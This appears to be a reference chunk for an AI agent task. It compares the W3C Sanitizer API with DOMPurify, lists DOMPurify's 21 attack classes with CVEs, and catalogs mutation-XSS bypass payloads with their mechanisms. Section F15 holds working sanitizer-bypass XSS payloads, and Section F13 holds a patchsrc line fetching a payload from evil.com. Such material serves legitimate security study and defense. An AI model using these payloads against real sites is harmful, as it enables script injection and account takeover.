# AGENT TASK: Sanitizer API, Attack Taxonomy, and Complete Payload Library
# PURPOSE: W3C Sanitizer API gaps, 21 attack classes, full mXSS payload taxonomy
# PRIORITY: Reference chunk for payload selection and attack classification
# INPUTS: Target browser support, whether W3C Sanitizer API is used
# OUTPUT: Applicable payloads, attack class matches, migration risk assessment
# SECTIONS: F12-F16 (Sanitizer API, Partial Updates, Attack Classes, Payloads, References)
---

## SECTION F12: W3C Sanitizer API — Migration Strategy and Gaps

### Current Browser Support (October 2026)

| Browser | Version | `setHTML()` (Safe) | `setHTMLUnsafe()` | `Sanitizer` constructor |
|---|---|---|---|---|
| Firefox | 148+ | Shipped | Shipped | Shipped |
| Chrome | 146+ | Shipped | Shipped | Shipped |
| Edge | 146+ | Shipped | Shipped | Shipped |
| Safari | 18.x | **NOT implemented** | Shipped (17.4+) | **NOT implemented** |
| Safari iOS | 18.x | **NOT implemented** | Shipped (17.4+) | **NOT implemented** |

**Status:** NOT "Baseline" — Safari's missing `setHTML()` and `Sanitizer` constructor blocks cross-browser adoption. Safari only implements the "unsafe" variant (`setHTMLUnsafe`), which provides no sanitization.

### Fundamental Architectural Differences from DOMPurify

The W3C Sanitizer API eliminates the entire class of mutation XSS (mXSS) vulnerabilities by design:

```
DOMPurify flow:
  String → Parse to DOM → TreeWalker sanitize → Serialize to String → innerHTML → Re-parse to DOM
                                                                       ↑ mXSS HERE

Sanitizer API flow:
  String → Parse to DOM → Sanitize → Insert to live DOM (no re-parse)
                                      ↑ No serialize/reparse = No mXSS possible
```

**Key differences:**

| Feature | DOMPurify | Sanitizer API |
|---|---|---|
| Output type | String (HTML) | DOM mutation (direct) |
| mXSS possible? | Yes (serialize/reparse) | No (eliminates reparse) |
| Server-side support | Yes (jsdom) | No browser API |
| Hook system | Yes (7 hook points) | No |
| Configuration options | 30+ options | ~10 options |
| Custom element handling | Extensive | Basic |
| `SAFE_FOR_TEMPLATES` | Yes | No equivalent |
| Trusted Types | Separate integration | IS the trust boundary |
| String output | Default | Not available |
| Shadow DOM handling | Via configuration | Strips declarative shadow DOM |

### Migration Pattern

```javascript
/**
 * Progressive enhancement migration from DOMPurify to Sanitizer API.
 *
 * IMPORTANT: This is NOT a drop-in replacement.
 * - setHTML() mutates the DOM directly — it does NOT return a string.
 * - The config format differs between DOMPurify and Sanitizer API.
 * - Hook-based customization has no Sanitizer API equivalent.
 */
function safeSetHTML(element, untrustedHTML, domPurifyConfig) {
  if ('setHTML' in HTMLElement.prototype) {
    // Use the native Sanitizer API (Chrome 146+, Firefox 148+)
    const sanitizerConfig = translateConfig(domPurifyConfig);
    const sanitizer = new Sanitizer(sanitizerConfig);
    element.setHTML(untrustedHTML, { sanitizer });
  } else {
    // Fallback to DOMPurify for Safari and older browsers
    element.innerHTML = DOMPurify.sanitize(untrustedHTML, domPurifyConfig);
  }
}

/**
 * Translate DOMPurify config to Sanitizer API config.
 * WARNING: Not all DOMPurify options have Sanitizer API equivalents.
 */
function translateConfig(dpConfig) {
  const config = {};

  // ALLOWED_TAGS → elements (allowlist)
  if (dpConfig.ALLOWED_TAGS) {
    config.elements = dpConfig.ALLOWED_TAGS.map(tag => tag.toLowerCase());
  }

  // ALLOWED_ATTR → attributes (allowlist)
  if (dpConfig.ALLOWED_ATTR) {
    config.attributes = dpConfig.ALLOWED_ATTR.map(attr => attr.toLowerCase());
  }

  // FORBID_TAGS → removeElements
  if (dpConfig.FORBID_TAGS) {
    config.removeElements = dpConfig.FORBID_TAGS.map(tag => tag.toLowerCase());
  }

  // FORBID_ATTR → removeAttributes
  if (dpConfig.FORBID_ATTR) {
    config.removeAttributes = dpConfig.FORBID_ATTR.map(attr => attr.toLowerCase());
  }

  // NO EQUIVALENT for:
  // - SAFE_FOR_TEMPLATES
  // - ADD_TAGS / ADD_ATTR (function predicates)
  // - CUSTOM_ELEMENT_HANDLING
  // - USE_PROFILES
  // - RETURN_DOM / RETURN_DOM_FRAGMENT
  // - IN_PLACE
  // - WHOLE_DOCUMENT
  // - NAMESPACE
  // - PARSER_MEDIA_TYPE
  // - Hooks (uponSanitizeElement, etc.)

  return config;
}

/**
 * For code paths that REQUIRE a sanitized string (not DOM mutation):
 * Sanitizer API cannot help — DOMPurify remains necessary.
 */
function sanitizeToString(untrustedHTML, config) {
  // Sanitizer API has NO string output mode
  // This is intentional: string output enables mXSS
  return DOMPurify.sanitize(untrustedHTML, config);
}
```

### Gaps in the Sanitizer API

**1. No `SAFE_FOR_TEMPLATES` equivalent**
Applications using Angular, Vue, or Handlebars-style template syntax (`{{expression}}`) have no way to sanitize template delimiters through the Sanitizer API. DOMPurify's `SAFE_FOR_TEMPLATES` mode escapes these patterns to prevent template injection.

**2. No hook system for custom filtering**
DOMPurify's 7 hook points (`beforeSanitizeElements`, `uponSanitizeElement`, `afterSanitizeElements`, `beforeSanitizeAttributes`, `uponSanitizeAttribute`, `afterSanitizeAttributes`, `afterSanitizeShadowDOM`) allow fine-grained custom logic. The Sanitizer API provides static configuration only — no per-element or per-attribute callbacks.

**3. No Trusted Types integration in the API itself**
The Sanitizer API IS the trust boundary — `setHTML()` is defined as a safe sink that does not require a Trusted Type. This is architecturally different from DOMPurify's `RETURN_TRUSTED_TYPE` option, which wraps sanitized output in a `TrustedHTML` object for use with other sinks.

**4. Limited configuration compared to DOMPurify**
DOMPurify offers 30+ configuration options; the Sanitizer API provides approximately 10. Complex sanitization policies that use DOMPurify features like `USE_PROFILES`, `CUSTOM_ELEMENT_HANDLING`, or `ALLOWED_URI_REGEXP` cannot be expressed through the Sanitizer API.

**5. `setHTML()` cannot return a string**
This is by design (string output enables mXSS), but it fundamentally changes integration patterns. Code that passes sanitized HTML as a string to other functions, stores it in databases, sends it in API responses, or uses it in server-side rendering cannot migrate to `setHTML()`.

**6. No server-side equivalent**
The Sanitizer API is a browser-only API. Server-side sanitization (Node.js, Deno, Bun) must continue using DOMPurify with jsdom or similar DOM implementations.

---

## SECTION F13: Declarative Partial Updates Deep Dive

### Chrome 150+ WICG Proposal

Chrome 150+ introduces a WICG (Web Incubator Community Group) proposal for declarative partial DOM updates, enabling server-driven incremental rendering:

**Core primitives:**
- `<template for="target-name">` — targets named patchable ranges in the document
- Processing instructions mark patchable ranges:
  - `<?start name="...">` — begins a named range
  - `<?end>` — ends the current range
  - `<?marker name="...">` — marks a point for insertion
- `patchsrc` attribute — fetches patch content from a URL
- `streamAppendHTMLUnsafe()` — applies patches to the document incrementally

### DOMPurify Defense Mechanisms

DOMPurify's `SAFE_FOR_XML` mode (enabled by default) provides defense against declarative partial update attacks:

```javascript
// SAFE_FOR_XML strips dangerous attributes and processing instructions

// Input with partial update attributes:
const input = '<template for="user-content"><div patchsrc="/evil/endpoint">content</div></template>';

// DOMPurify with default config:
const clean = DOMPurify.sanitize(input);
// Output: <div>content</div>
// - <template> removed (not in default allowed tags)
// - 'for' attribute stripped by SAFE_FOR_XML
// - 'patchsrc' attribute stripped (not in allowed attributes)

// Processing instructions:
const input2 = '<div><?start name="injection"?>safe content<?end?></div>';
// HTML parser treats processing instructions as bogus comments
// DOMPurify strips comments by default
// Output: <div>safe content</div>
```

### Attack Surface

```html
<!-- Attack vector 1: Processing instruction injection via SVG -->
<svg><?marker name="x"?></svg>
<template for="x"><style><img src onerror=alert()></style></template>
```

**DOMPurify defense:** `SAFE_FOR_XML` removes the `for` attribute from `<template>`, preventing the patch target binding. The processing instruction inside `<svg>` is parsed as a bogus comment and stripped by default comment removal.

```html
<!-- Attack vector 2: patchsrc for content loading -->
<div patchsrc="https://evil.com/xss-payload.html">
  Innocent looking content
</div>
```

**DOMPurify defense:** `patchsrc` is not in `ALLOWED_ATTR` defaults and will be stripped. However, if an application uses `ADD_ATTR: ['patchsrc']` to support partial updates, the attribute survives sanitization.

```html
<!-- Attack vector 3: streamAppendHTMLUnsafe() bypass -->
<!-- This function bypasses ALL sanitization by design -->
<script>
  // Application code that uses streamAppendHTMLUnsafe
  const response = await fetch('/api/updates');
  const reader = response.body.getReader();
  document.streamAppendHTMLUnsafe(reader);
  // Content from /api/updates is inserted WITHOUT sanitization
</script>
```

**DOMPurify cannot defend against `streamAppendHTMLUnsafe()`** — the function name explicitly indicates it is unsafe, and it bypasses the entire sanitization pipeline by design. Applications using this API must implement their own server-side sanitization of the streamed content.

### Trusted Types Integration

A Trusted Types enabler for `streamAppendHTMLUnsafe()` is planned but **not yet implemented** as of October 2026. Once implemented, Trusted Types policies would require the streamed content to pass through a policy before insertion:

```javascript
// Future: Trusted Types enforcement on streaming APIs
const policy = trustedTypes.createPolicy('streaming', {
  createHTML: (input) => DOMPurify.sanitize(input)
});

// streamAppendHTMLUnsafe would require TrustedHTML
// (not yet implemented)
```

### Risk Assessment

| Scenario | Risk Level | Mitigation |
|---|---|---|
| Default DOMPurify config | **Low** | `SAFE_FOR_XML` strips attack vectors |
| `SAFE_FOR_XML: false` | **High** | `for`, `patchsrc` attributes survive |
| `ADD_ATTR: ['patchsrc']` | **Critical** | Content loading from attacker URL |
| Post-processing for streaming | **Critical** | Sanitized output modified before streaming insertion |
| `streamAppendHTMLUnsafe()` | **Critical** | Bypasses all client-side sanitization by design |

---

## SECTION F14: DOMPurify 21 Official Attack Classes

Complete taxonomy from the DOMPurify wiki (as of version 3.4.9), with explanations and cross-references to CVEs:

### 1. Context Mismatch
Sanitized HTML is safe for insertion via `innerHTML` in an HTML document context. It is **NOT safe** for:
- JavaScript string contexts (`var x = "SANITIZED_OUTPUT"`)
- HTML attribute contexts (`<div title="SANITIZED_OUTPUT">`)
- SVG document contexts (different parsing rules)
- Template engine contexts (`{{SANITIZED_OUTPUT}}`)
- CSS contexts (`<style>SANITIZED_OUTPUT</style>`)

### 2. Mutation XSS (mXSS)
The DOM tree changes between serialization (DOMPurify output) and re-parsing (browser `innerHTML`). The serialize-reparse cycle is fundamental to mXSS.
**CVEs:** CVE-2024-47875 (CVSS 10.0), CVE-2020-26870, CVE-2025-26791

### 3. Namespace Confusion
HTML, SVG, and MathML have different parsing rules. Elements crossing namespace boundaries (e.g., HTML content inside SVG `<foreignObject>`) may be parsed differently than expected.
**Key elements:** `<foreignObject>`, `<desc>`, `<title>` (in SVG context)

### 4. Integration Point Breakouts
Certain elements serve as integration points between namespaces. `<foreignObject>` in SVG and `<annotation-xml>` in MathML switch the parser back to HTML mode, potentially allowing HTML elements that should not appear in those contexts.

### 5. Rawtext/RCDATA Breakouts
Content inside rawtext elements (`<xmp>`, `<noembed>`, `<noframes>`, `<noscript>`, `<plaintext>`) is parsed as raw text, not HTML. If DOMPurify misses a rawtext element, content inside it is not sanitized.
**CVE:** CVE-2026-0540 (GHSA-h8r8-wccr-v5f2)

### 6. Depth-Limit Flattening
WebKit and Blink enforce a 512-element nesting limit. Elements beyond this depth are "flattened" (moved to a shallower position in the tree). This flattening changes the DOM structure post-sanitization, potentially creating new execution contexts.
**CVE:** CVE-2024-47875 (exploits depth flattening for mXSS)

### 7. Nesting-Based mXSS
A specific mXSS variant where deeply nested elements create parse ambiguity. The nesting pattern causes the serialized output to be re-parsed into a different tree structure.
**CVE:** CVE-2024-47875 (CVSS 10.0)

### 8. Limits of DOM-Only Sanitization
DOMPurify operates on the DOM representation, not the raw HTML string. Certain attacks target the gap between string-level and DOM-level representations (e.g., character encoding differences, BOM handling, null bytes).

### 9. SAFE_FOR_XML Attribute Guards
`SAFE_FOR_XML` mode removes XML-unsafe characters from attribute values and strips certain attributes. Disabling this mode expands the attack surface significantly, particularly for declarative partial updates (Attack Class 19).

### 10. Foster Parenting (Table Insertion Rules)
The HTML parser applies special "foster parenting" rules for content that appears in invalid positions inside `<table>` elements. Foster-parented content is moved before the table, potentially changing the DOM structure in security-relevant ways.
```html
<table><div>foster-parented</div><tr><td>in table</td></tr></table>
<!-- The <div> is moved BEFORE the table by foster parenting -->
```

### 11. DOM Clobbering
Named elements (`id` and `name` attributes) can shadow global properties and DOM API methods. DOMPurify blocks some clobbering vectors but cannot prevent all of them without breaking legitimate HTML.
**Related research:** Hulk (USENIX Security 2025) — 497 zero-day clobbering gadgets.

### 12. Cross-Realm Input and IN_PLACE Mode
When input comes from a different JavaScript realm (iframe, worker), `instanceof` checks fail. In `IN_PLACE` mode, this can cause DOMPurify to misidentify node types.
**CVE:** CVE-2026-49458 (GHSA-hpcv-96wg-7vj8)

### 13. Template Reassembly
`<template>` elements have special parsing behavior — their content exists in a separate document fragment. Mutations during template content extraction and reinsertion can create executable content.
**CVE:** CVE-2025-26791 (DOMPurify 3.2.3 bypass with `SAFE_FOR_TEMPLATES` + `CUSTOM_ELEMENT_HANDLING`)

### 14. Permissive Custom Elements
Custom elements (tags with hyphens) are increasingly common in web applications. DOMPurify's `CUSTOM_ELEMENT_HANDLING` allows them but introduces attack surface through `tagNameCheck`/`attributeNameCheck` functions.
**CVE:** CVE-2026-66010 (GHSA-c2j3-45gr-mqc4)

### 15. Prototype Pollution as Config Downgrade
Polluting `Object.prototype` with DOMPurify config keys (e.g., `ALLOWED_TAGS`, `FORBID_ATTR`) can downgrade the sanitization configuration without the developer's knowledge.
**CVEs:** CVE-2024-45801, CVE-2026-65913, CVE-2026-41238

### 16. Allow/Block Precedence (ADD_TAGS vs. FORBID_TAGS)
The interaction between `ADD_TAGS` and `FORBID_TAGS` has non-obvious precedence rules. Function predicates in `ADD_TAGS` can override `FORBID_TAGS` entries.
**CVE:** CVE-2026-41240 (GHSA-h7mw-gpvr-xq4m)

### 17. URI Scheme Confusion
DOMPurify validates URI schemes in `href`, `src`, and similar attributes. Misconfigurations (e.g., `ADD_ATTR` bypassing URI validation) can allow `javascript:` URIs.
**CVE:** CVE-2026-65912 (GHSA-cjmm-f4jc-qw8r)

### 18. Engine-Deferred Mutation
Browser engines may perform deferred DOM mutations after DOMPurify completes sanitization. Chrome's `<selectedcontent>` element is the canonical example.
**CVE:** CVE-2026-47423 (GHSA-87xg-pxx2-7hvx, CVSS 8.2)

### 19. Declarative Partial Updates (Chrome 150+)
The WICG partial update proposal introduces new attributes (`for`, `patchsrc`) and APIs (`streamAppendHTMLUnsafe()`) that can bypass sanitization. See Section F13 for full analysis.

### 20. Server-Side DOM Differences
jsdom and other server-side DOM implementations differ from browser DOMs in parsing behavior, API support, and edge case handling. These differences can create server-specific bypass vectors.

### 21. Configuration Foot-Guns
DOMPurify's 30+ configuration options create a vast space of possible configurations. Many configurations that appear reasonable are actually insecure (e.g., `ADD_ATTR: ['href']` bypassing URI validation, `SAFE_FOR_XML: false` enabling partial update attacks).

**Source:** https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History

---

## SECTION F15: Complete mXSS Payload Taxonomy

Organized by vector type, with browser-specific notes and DOMPurify version applicability.

### Namespace Switching (SVG to HTML)

Exploits the transition from SVG parsing context back to HTML parsing context:

```html
<svg></p><style><g title="</style><img src onerror=alert(1)>">
```

**Mechanism:**
1. `<svg>` switches parser to SVG namespace
2. `</p>` is invalid in SVG — browser behavior varies
3. `<style>` is parsed differently in SVG (as a valid SVG element) vs. HTML (as rawtext)
4. The `title` attribute content contains what looks like a closing `</style>` tag
5. After serialization and re-parse, the browser interprets the closing tag as ending the `<style>`, causing the `<img>` to be parsed as HTML

**Affected:** DOMPurify < 2.0.0 (historical, long patched)

### MathML Namespace Confusion (CVE-2020-26870)

```html
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

**Mechanism:**
1. `<form>` opens in HTML context
2. `<math>` switches to MathML namespace
3. `<mtext>` is a MathML integration point (switches back to HTML parsing)
4. `</form>` closes the outer form but the parser state is complex
5. Second `<form>` opens in a confused context
6. `<mglyph>` (or `<malignmark>`) triggers special handling in MathML
7. `<style>` content is misinterpreted after serialize/reparse
8. `</math>` ends the MathML context, and `<img>` is parsed as HTML

### Table Foster-Parenting

```html
<math><mtext><table><mglyph><style><img src=x onerror="alert(1)"></table>
```

**Mechanism:**
1. `<table>` triggers the HTML parser's table insertion mode
2. `<mglyph>` inside a `<table>` is not a valid table child
3. Foster parenting moves `<mglyph>` before the table
4. The `<style>` element's content is now in a different context after foster parenting
5. Serialization produces output where `<img>` escapes the style context

### Comment Trick (Gareth Heyes)

```html
<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">
```

**Mechanism:**
1. Combines table foster parenting with HTML comment parsing differentials
2. `<!--` begins an HTML comment inside `<style>`
3. After serialization, the comment boundary shifts
4. `-->` inside the `title` attribute closes the comment, exposing the inner `<img>` as executable HTML
5. The `onerror` handler executes

### Heading-Tag Adoption Agency Algorithm (AAA)

```html
<math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><style><a title="</style><img src onerror='alert(1)'>"></style>
```

**Mechanism:**
1. `<h1>` and `<h6>` trigger the Adoption Agency Algorithm (AAA)
2. The AAA restructures formatting elements (`<a>`) across heading boundaries
3. The restructuring changes the DOM tree in ways that differ between parse and reparse
4. `<mglyph>` in SVG context provides a namespace switching point
5. The `title` attribute content escapes `<style>` after reparse

### foreignObject Removal

```html
<svg><foreignobject><p><style><p title="</style><iframe onload&#x3d;alert(1)<!--"></style>
```

**Mechanism:**
1. `<foreignObject>` is an SVG integration point that switches to HTML parsing
2. DOMPurify may remove `<foreignObject>` but leave its children
3. The orphaned children are now in SVG context instead of HTML
4. `<style>` parsing differs between SVG and HTML contexts
5. `&#x3d;` is the HTML entity for `=`, which is decoded in attribute values

### Rawtext Container

```html
<noembed><svg><b><style><b title='</style><img src=x onerror=alert(1)>'>
```

**Mechanism:**
1. `<noembed>` is a rawtext element — its content is parsed as raw text, not HTML
2. The `<svg>` and `<b>` inside are text, not elements, during initial parse
3. DOMPurify may strip `<noembed>` but serialize its text content as HTML
4. On reparse, the text content is now parsed as HTML elements
5. The `<style>` / `<img>` sequence enables XSS

### Noscript Scripting Flag

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

**Mechanism:**
1. `<noscript>` behavior depends on the **scripting flag**
2. With scripting enabled (normal browser execution): `<noscript>` content is rawtext
3. DOMPurify parses without scripting flag → `<noscript>` content parsed as HTML
4. The `title` attribute appears to close `<noscript>` in the scripting-enabled parse
5. `<img>` executes as HTML after the "closed" noscript

**Note:** DOMPurify handles this by explicitly removing `<noscript>` regardless of configuration.

### DOMPurify 3.2.3 Non-Default Bypass (CVE-2025-26791)

```javascript
DOMPurify.sanitize(
  `<math><foo-test><mi><li><table><foo-test><li></li></foo-test><a>
      <style><! \${</style>}
      <foo-b id="><img src onerror='alert(1)'>">hmm...</foo-b>
    </a></table></li></mi></foo-test></math>`,
  {
    SAFE_FOR_TEMPLATES: true,
    CUSTOM_ELEMENT_HANDLING: {
      tagNameCheck: /^foo-/
    }
  }
);
```

**Mechanism:**
1. Custom elements (`foo-test`, `foo-b`) are allowed by `tagNameCheck`
2. `SAFE_FOR_TEMPLATES: true` activates template delimiter escaping
3. MathML context (`<math>`) provides namespace confusion
4. `<table>` triggers foster parenting in HTML context
5. The `<style>` element contains a `${` template delimiter that `SAFE_FOR_TEMPLATES` attempts to escape
6. The escaping interacts with the `<! ` (malformed comment/DOCTYPE) to create a parsing differential
7. The `id` attribute of `<foo-b>` contains a `"` that, after reparse in a different context, breaks the attribute boundary
8. The `<img src onerror='alert(1)'>` inside the `id` value becomes executable HTML

**Conditions required:**
- `SAFE_FOR_TEMPLATES: true` (non-default)
- `CUSTOM_ELEMENT_HANDLING` with a `tagNameCheck` that matches attacker elements (non-default)
- Both conditions together create the vulnerability; neither alone is sufficient

### Template Literal Injection (Variant of CVE-2025-26791)

```javascript
// Additional payload variant exploiting template literal interaction
DOMPurify.sanitize(
  '<math><mi><table><custom-el><td><style>${alert(1)}</style></td></custom-el></table></mi></math>',
  {
    SAFE_FOR_TEMPLATES: true,
    CUSTOM_ELEMENT_HANDLING: { tagNameCheck: /^custom-/ }
  }
);
// SAFE_FOR_TEMPLATES escapes ${ to &#36;{ in attributes
// but the <style> content escaping and table foster parenting
// create a context where the escaping is reversed after reparse
```

---

## SECTION F16: Enhanced Reference Database

All sources referenced throughout the forensic analysis, organized by category.

### DOMPurify Official Resources

| Resource | URL |
|---|---|
| Wiki: Attack Classes & Bypass History | https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History |
| Wiki: Security Goals & Threat Model | https://github.com/cure53/DOMPurify/wiki/Security-Goals-&-Threat-Model |
| Security Advisories (All) | https://github.com/cure53/DOMPurify/security/advisories |
| npm Package | https://www.npmjs.com/package/dompurify |
| Source Code (GitHub) | https://github.com/cure53/DOMPurify |

#### Individual GHSA Links

| Advisory | CVE | Severity |
|---|---|---|
| [GHSA-p3vf-v8qc-cwcr](https://github.com/cure53/DOMPurify/security/advisories/GHSA-p3vf-v8qc-cwcr) | CVE-2024-45801 | Critical |
| [GHSA-gx9m-whjm-85jf](https://github.com/cure53/DOMPurify/security/advisories/GHSA-gx9m-whjm-85jf) | CVE-2024-47875 | Critical |
| [GHSA-mmhx-hmjr-r674](https://github.com/cure53/DOMPurify/security/advisories/GHSA-mmhx-hmjr-r674) | — | High |
| [GHSA-87xg-pxx2-7hvx](https://github.com/cure53/DOMPurify/security/advisories/GHSA-87xg-pxx2-7hvx) | CVE-2026-47423 | High |
| [GHSA-h8r8-wccr-v5f2](https://github.com/cure53/DOMPurify/security/advisories/GHSA-h8r8-wccr-v5f2) | CVE-2026-0540 | Moderate |
| [GHSA-cjmm-f4jc-qw8r](https://github.com/cure53/DOMPurify/security/advisories/GHSA-cjmm-f4jc-qw8r) | CVE-2026-65912 | Moderate |
| [GHSA-cj63-jhhr-wcxv](https://github.com/cure53/DOMPurify/security/advisories/GHSA-cj63-jhhr-wcxv) | CVE-2026-65913 | Moderate |
| [GHSA-v9jr-rg53-9pgp](https://github.com/cure53/DOMPurify/security/advisories/GHSA-v9jr-rg53-9pgp) | CVE-2026-41238 | Moderate |
| [GHSA-39q2-94rc-95cp](https://github.com/cure53/DOMPurify/security/advisories/GHSA-39q2-94rc-95cp) | CVE-2026-65903 | Moderate |
| [GHSA-crv5-9vww-q3g8](https://github.com/cure53/DOMPurify/security/advisories/GHSA-crv5-9vww-q3g8) | CVE-2026-41239 | Moderate |
| [GHSA-h7mw-gpvr-xq4m](https://github.com/cure53/DOMPurify/security/advisories/GHSA-h7mw-gpvr-xq4m) | CVE-2026-41240 | Moderate |
| [GHSA-hpcv-96wg-7vj8](https://github.com/cure53/DOMPurify/security/advisories/GHSA-hpcv-96wg-7vj8) | CVE-2026-49458 | Moderate |
| [GHSA-r47g-fvhr-h676](https://github.com/cure53/DOMPurify/security/advisories/GHSA-r47g-fvhr-h676) | — | Moderate |
| [GHSA-76mc-f452-cxcm](https://github.com/cure53/DOMPurify/security/advisories/GHSA-76mc-f452-cxcm) | — | Moderate |
| [GHSA-rp9w-3fw7-7cwq](https://github.com/cure53/DOMPurify/security/advisories/GHSA-rp9w-3fw7-7cwq) | CVE-2026-49978 | Moderate |
| [GHSA-9p3w-6h5p-cv75](https://github.com/cure53/DOMPurify/security/advisories/GHSA-9p3w-6h5p-cv75) | CVE-2026-65911 | Moderate |
| [GHSA-x4vx-rjvf-j5p4](https://github.com/cure53/DOMPurify/security/advisories/GHSA-x4vx-rjvf-j5p4) | — | Low |
| [GHSA-gvmj-g25r-r7wr](https://github.com/cure53/DOMPurify/security/advisories/GHSA-gvmj-g25r-r7wr) | — | Low |
| [GHSA-vxr8-fq34-vvx9](https://github.com/cure53/DOMPurify/security/advisories/GHSA-vxr8-fq34-vvx9) | CVE-2026-65899 | Low |
| [GHSA-cmwh-pvxp-8882](https://github.com/cure53/DOMPurify/security/advisories/GHSA-cmwh-pvxp-8882) | — | Low |
| [GHSA-c2j3-45gr-mqc4](https://github.com/cure53/DOMPurify/security/advisories/GHSA-c2j3-45gr-mqc4) | CVE-2026-66010 | Low |
| [GHSA-55q2-fjhq-7xh7](https://github.com/cure53/DOMPurify/security/advisories/GHSA-55q2-fjhq-7xh7) | — | Low |

### Academic Papers

| Paper | Venue | Year | URL |
|---|---|---|---|
| "In the DOM We Trust" | ACM CCS | 2025 | https://trouge.net/papers/in_the_dom_we_trust_ccs25.pdf |
| Hulk: DOM Clobbering at Scale | USENIX Security | 2025 | https://www.usenix.org/system/files/usenixsecurity25-liu-zhengyu.pdf |
| MutaGen: Parsing Differentials | TU Braunschweig | 2024 | https://www.ias.cs.tu-bs.de/publications/parsing_differentials.pdf |
| mXSS Attacks (Heiderich et al.) | ACM CCS | 2013 | — |

### Tools and Frameworks

| Tool | URL |
|---|---|
| SonarSource mXSS Cheatsheet | https://sonarsource.github.io/mxss-cheatsheet |
| mutagen Research Lab | https://github.com/Robert-Doe/mutagen |
| DOM Clobbering Cheatsheet | https://github.com/ridpath/dom-clobbering-cheatsheet |
| Awesome mXSS | https://github.com/msrkp/MXSS |
| mXSS Evolution (s1r1us) | https://s1r1us.ninja/posts/mxss-101/ |

### CSS Exfiltration Research

| Title | URL |
|---|---|
| Fontleak | https://adragos.ro/fontleak/ |
| CSS Injection Primitives | https://x-c3ll.github.io/posts/CSS-Injection-Primitives/ |
| Blind CSS Exfiltration (PortSwigger) | https://portswigger.net/research/blind-css-exfiltration |
| CSS Keylogging | https://deepwiki.com/maxchehab/CSS-Keylogging |

### Real-World Incidents and Case Studies

| Incident | URL |
|---|---|
| Swagger UI XSS (Account Takeover) | https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers |
| SonarSource mXSS Analysis | https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/ |
| TinyMCE Stored XSS (CVE-2024-47759/47762) | https://corgea.com/research/tinymce-47759-47762-stored-xss-sanitizer-bypass |
| Supply Chain Attack (malicious npm package) | https://socket.dev/blog/malicious-express-dompurify-npm-package-steals-sensitive-data |
| DOMPurify 3.2.3 Bypass Analysis | https://ensy.zip/posts/dompurify-323-bypass/ |

### Browser Specifications and Changes

| Specification | URL |
|---|---|
| WHATWG Attribute Escaping (Chrome) | https://developer.chrome.com/blog/escape-attributes |
| WHATWG Foreign Content Issue | https://github.com/whatwg/html/issues/11397 |
| W3C Trusted Types | https://www.w3.org/TR/trusted-types/ |
| WHATWG HTML Parsing Specification | https://html.spec.whatwg.org/multipage/parsing.html |

### HackerOne Bug Bounty Reports

| Report ID | Target | Description |
|---|---|---|
| #1024734 | DOMPurify | SVG mutation bypass |
| #1072868 | GitLab | Swagger UI XSS via DOMPurify bypass |
| #3581911 | Trix Editor | Stored XSS via sanitizer bypass |
| #2819573 | Trix/DOMPurify | Combined XSS bypass |
| #2106708 | HackerOne | Platform reflected XSS bypass |
| #949382 | Tumblr | DOM-based XSS |
| #2921905 | Doppler | DOMPurify XSS bypass |

### Vulnerability Databases

| Database | URL |
|---|---|
| Snyk DOMPurify Versions | https://security.snyk.io/package/npm/dompurify/versions |
| VulnCheck Advisories | https://www.vulncheck.com/advisories/ |
| Patchstack (WordPress) | https://patchstack.com/ |
| GitHub Advisory Database | https://github.com/advisories |
| NVD (NIST) | https://nvd.nist.gov/ |

---

**End of Forensic Addendum**

<!-- BEGIN DEEP ATTACK METHODOLOGY v2.1 -->

---
